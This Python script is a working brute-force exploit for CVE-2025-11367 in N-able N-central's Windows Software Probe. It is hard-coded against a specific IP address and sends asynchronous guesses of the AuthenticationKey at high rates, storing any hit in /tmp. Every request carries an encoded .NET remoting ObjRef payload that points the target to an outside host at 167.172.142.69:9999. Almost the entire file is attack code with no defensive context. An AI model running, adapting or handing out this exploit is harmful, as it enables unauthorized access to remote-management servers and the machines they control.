#!/usr/bin/env python3
"""
CVE-2025-11367 AuthenticationKey brute forcer - async version
N-able N-central Windows Software Probe - port 10004/ProofOfConcept
Targets ~3000+ req/s using asyncio instead of threading.
"""

import asyncio, struct, base64, time, argparse, sys

TARGET = "138.207.64.28"
PORT   = 10004
URI    = "ProofOfConcept"

PROBE_B64 = (
    "AAEAAAD/////AQAAAAAAAAAEAQAAABBTeXN0ZW0uRXhjZXB0aW9uAQAAAAlDbGFzc05hbWUDHlN5c"
    "3RlbS5SdW50aW1lLlJlbW90aW5nLk9ialJlZgkCAAAABAIAAAAeU3lzdGVtLlJ1bnRpbWUuUmVt"
    "b3RpbmcuT2JqUmVmAQAAAAN1cmwBBgMAAAAadGNwOi8vMTY3LjE3Mi4xNDIuNjk6OTk5OS8L"
)
PAYLOAD = base64.b64decode(PROBE_B64)
BAD_SIZES = {3700, 8612}

total_tried = 0
found_key   = None
start_time  = time.time()


def encode_str_utf8(s):
    b = s.encode("utf-8")
    return bytes([0x01]) + struct.pack("<i", len(b)) + b


def build_frame(auth_key):
    h = (
        struct.pack("<H", 6) + bytes([0x01]) + encode_str_utf8("application/octet-stream") +
        struct.pack("<H", 4) + bytes([0x01]) + encode_str_utf8(URI) +
        struct.pack("<H", 1) + encode_str_utf8("__RequestUri") + encode_str_utf8(URI) +
        struct.pack("<H", 1) + encode_str_utf8("AuthenticationKey") + encode_str_utf8(str(auth_key)) +
        struct.pack("<H", 0)
    )
    return (
        struct.pack("<I", 0x54454E2E) + bytes([0x01, 0x00]) +
        struct.pack("<H", 0) + struct.pack("<H", 0) +
        struct.pack("<i", len(PAYLOAD)) + h + PAYLOAD
    )


async def probe(key, sem, timeout=2.0):
    global total_tried, found_key
    async with sem:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT), timeout=timeout
            )
            writer.write(build_frame(key))
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(16384), timeout=timeout)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            size = len(resp)
            total_tried += 1

            if size > 0 and size not in BAD_SIZES:
                strs = []
                cur = ""
                for b in resp:
                    if 32 <= b < 127:
                        cur += chr(b)
                    else:
                        if len(cur) >= 5:
                            strs.append(cur)
                        cur = ""
                full = " ".join(strs)
                if "SecurityException" not in full:
                    found_key = key
                    print(f"\n[!!!] HIT: AuthenticationKey = {key}")
                    print(f"      Size: {size}B  Content: {full[:300]}")
                    try:
                        with open("/tmp/found_key.txt", "w") as f:
                            f.write(f"key={key}\nsize={size}\n{full}\n")
                    except Exception:
                        pass
        except Exception:
            total_tried += 1


async def run(start, end, concurrency, timeout):
    global found_key
    sem = asyncio.Semaphore(concurrency)
    tasks = []
    batch = 5000

    t_last = time.time()
    n_last = 0

    for key in range(start, end + 1):
        if found_key is not None:
            break

        tasks.append(asyncio.create_task(probe(key, sem, timeout)))

        if len(tasks) >= batch:
            await asyncio.gather(*tasks)
            tasks = []

            now = time.time()
            elapsed = now - start_time
            rate = total_tried / elapsed if elapsed > 0 else 0
            window_rate = (total_tried - n_last) / (now - t_last) if (now - t_last) > 0 else 0
            remaining = (end - start + 1) - total_tried
            eta_h = remaining / window_rate / 3600 if window_rate > 0 else 0
            print(f"[*] {total_tried:,} tried | {window_rate:.0f} req/s | key={key:,} | ETA {eta_h:.1f}h", flush=True)
            t_last = now
            n_last = total_tried

            if found_key is not None:
                break

    if tasks:
        await asyncio.gather(*tasks)


async def test_rate(concurrency, timeout):
    print(f"[*] Rate test: 2000 probes | concurrency={concurrency} | timeout={timeout}s")
    global start_time
    start_time = time.time()
    sem = asyncio.Semaphore(concurrency)
    tasks = [asyncio.create_task(probe(i, sem, timeout)) for i in range(1, 2001)]
    await asyncio.gather(*tasks)
    elapsed = time.time() - start_time
    rate = 2000 / elapsed
    print(f"[+] 2000 probes in {elapsed:.1f}s = {rate:.0f} req/s")
    total = 2_147_483_647
    eta_s = total / rate
    print(f"[+] Worst case ETA: {eta_s/3600:.1f}h ({eta_s/86400:.1f} days)")
    print(f"[+] Birthday (50%): {eta_s/3600/2:.1f}h ({eta_s/86400/2:.1f} days)")


def main():
    global TARGET
    parser = argparse.ArgumentParser(description="CVE-2025-11367 async AuthKey brute")
    parser.add_argument("--target",      default=TARGET)
    parser.add_argument("--start",       type=int, default=1)
    parser.add_argument("--end",         type=int, default=2_147_483_647)
    parser.add_argument("--concurrency", type=int, default=500,  help="Async concurrency (default 500)")
    parser.add_argument("--timeout",     type=float, default=2.0, help="Per-probe timeout seconds")
    parser.add_argument("--test-rate",   action="store_true")
    args = parser.parse_args()
    TARGET = args.target

    if args.test_rate:
        asyncio.run(test_rate(args.concurrency, args.timeout))
        return

    print(f"[*] CVE-2025-11367 async brute")
    print(f"[*] {TARGET}:{PORT}/{URI}")
    print(f"[*] Range: {args.start:,} - {args.end:,}  Concurrency: {args.concurrency}  Timeout: {args.timeout}s")
    asyncio.run(run(args.start, args.end, args.concurrency, args.timeout))

    elapsed = time.time() - start_time
    rate = total_tried / elapsed if elapsed > 0 else 0
    print(f"\n[*] Done: {total_tried:,} in {elapsed:.0f}s ({rate:.0f} req/s)")
    if found_key:
        print(f"[+] FOUND: AuthenticationKey = {found_key}")
    else:
        print("[-] Not found in range")


if __name__ == "__main__":
    main()
